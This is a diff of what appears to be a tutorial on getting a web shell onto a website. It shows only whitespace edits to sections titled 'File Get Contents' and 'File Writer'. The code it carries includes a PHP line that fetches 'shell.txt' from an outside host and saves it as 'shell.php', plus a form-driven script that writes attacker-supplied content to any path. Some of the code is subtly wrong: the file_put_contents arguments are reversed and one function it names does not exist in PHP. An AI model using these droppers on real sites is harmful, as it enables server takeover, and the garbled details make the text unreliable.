@@ -26,7 +26,7 @@
     ?>
 > This saves your file to the same directory of the uploader.    
 3. File Get Contents
-
+>
 
     <?php
     	file_put_contents(file_get_contents('https://somesite.com/shell.txt'),'shell.php');
@@ -37,12 +37,12 @@
 >If you managed to make a file uploader but it doesn't work, maybe the site does not allow uploading. Some sites don't enable upload functions, hence `move_uploaded_files` and `copy_uploaded_files` will not work. File writer works by using different command (`fwrite`).
 
 
-	<?php
-    	$a = $_POST['code'];
+    <?php
+        $a = $_POST['code'];
         $file = fopen($_POST['file'],'w');
         fwrite($file,$a);
         fclose($file);
-	?>
+    ?>
     <center>
       <form method="post" id="form">
         <h2>File Writer</h2>
